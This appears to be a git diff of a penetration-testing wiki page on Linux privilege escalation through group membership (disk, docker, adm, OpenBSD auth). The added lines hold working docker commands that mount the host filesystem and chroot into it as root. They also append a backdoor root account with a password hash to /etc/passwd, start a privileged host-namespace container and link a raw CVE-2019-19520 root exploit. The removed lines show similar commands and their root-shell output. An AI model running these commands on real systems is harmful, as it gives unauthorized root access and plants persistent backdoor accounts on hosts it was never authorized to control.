@@ -102,7 +102,8 @@ So, read the file and try to **crack some hashes**.
 
 Files:`/dev/sd[a-z][1-9]`
 
-```text
+```bash
+df -h #Find where "/" is mounted
 debugfs /dev/sda1
 debugfs: cd /root
 debugfs: ls
@@ -160,44 +161,27 @@ find / -group root -perm -g=w 2>/dev/null
 
 You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
 
-You can start reading [**this post about how to escalate privileges abusing the docker socket where you have write permissions**](../#writable-docker-socket).
+```bash
+docker image #Get images from the docker service
+
+#Get a shell inside a docker container with access as root to the filesystem
+docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
+#If you want full access from the host, create a backdoor in the passwd file
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
+
+#Ifyou just want filesystem and network access you can startthe following container:
+docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
+```
+
+Finally, if you don't like any of the suggestions of before, or they aren't working for some reason \(docker api firewall?\) you could always try to **run a privileged container and escape from it** as explained here:
+
+{% page-ref page="../docker-breakout.md" %}
+
+If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
-
-Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.
-
-```text
-$> docker run -it --rm -v $PWD:/mnt bash
-$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
-```
-
-Almost similar but you will also see all processes running on the host and be connected to the same NICs.
-
-```text
-docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
-```
-
-Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell
-
-```text
-$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
-latest: Pulling from chrisfosterelli/rootplease
-2de59b831a23: Pull complete 
-354c3661655e: Pull complete 
-91930878a2d7: Pull complete 
-a3ed95caeb02: Pull complete 
-489b110c54dc: Pull complete 
-Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
-Status: Downloaded newer image for chrisfosterelli/rootplease:latest
-
-You should now have a root shell on the host OS
-Press Ctrl-D to exit the docker instance / shell
-
-sh-5.0# id
-uid=0(root) gid=0(root) groups=0(root)
-```
 
 ## lxc/lxd Group
 
@@ -207,4 +191,9 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.  
 Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
+
+## Auth group
+
+Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.  
+These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
